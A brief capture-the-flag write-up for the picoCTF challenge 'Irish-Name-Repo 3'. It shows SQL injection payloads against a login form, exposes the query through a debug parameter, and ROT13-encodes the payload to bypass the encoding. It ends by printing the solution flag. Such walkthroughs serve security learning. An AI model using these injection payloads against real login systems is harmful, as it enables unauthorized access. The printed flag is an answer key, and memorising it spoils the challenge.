## Irish-Name-Repo 3

[Link to challenge](https://play.picoctf.org/practice/challenge/8)

Write-up:

1. Attempting different passwords, like `a' IS NOT 'b` and `' OR 1=1-- ` returns 
Internal Server Error. The hint tells us the password is encrypted.

2. Looking at the request, we see: `password=A&debug=0`. Setting debug to 1 allows
us to see the query being used.

3. `password=A&debug=1` returns `SQL query: SELECT * FROM admin where password = 'N'`.
This confirms the encryption.

4. `password=a'+IS+NOT+'b&debug=1` returns `password = 'n' VF ABG 'o'`, which indicates
simple ROT13.

5. `password=n'+VF+ABG+'o&debug=1` logs us in as admin and gets us the flag: **picoCTF{3v3n_m0r3_SQL_06a9db19}**
